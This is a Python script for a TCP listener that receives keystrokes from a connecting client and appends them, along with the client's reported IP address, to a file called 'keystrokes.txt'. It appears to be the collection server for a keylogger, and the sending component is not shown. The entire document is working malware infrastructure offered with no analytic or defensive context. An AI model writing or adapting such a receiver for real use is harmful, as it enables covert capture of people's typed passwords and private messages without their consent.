import socket

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(("127.0.0.1", 1234))
server_socket.listen(1)

print("Server listening on 127.0.0.1:1234")

try:
    client_socket, client_address = server_socket.accept()
    print(f"Connection established from {client_address}")

    filename = "keystrokes.txt"  # File to store received keystrokes
    with open(filename, 'a', encoding='utf-8') as f:  # Open file in append mode with UTF-8 encoding
        # Receive and write client's IP address first
        ip_address_bytes = client_socket.recv(1024)
        ip_address = ip_address_bytes.decode('utf-8')
        f.write(f"Client IP Address: {ip_address}\n\n")
        f.flush()  # Ensure data is written immediately

        # Receive and write keystrokes
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            keystrokes = data.decode('utf-8', errors='ignore')
            f.write(keystrokes)
            f.flush()  # Ensure data is written immediately

    print(f"Data received and saved to {filename}")

except Exception as e:
    print(f"Error receiving or saving data: {e}")

finally:
    try:
        if client_socket:
            client_socket.close()
        server_socket.close()
    except Exception as e:
        print(f"Error closing sockets: {e}")
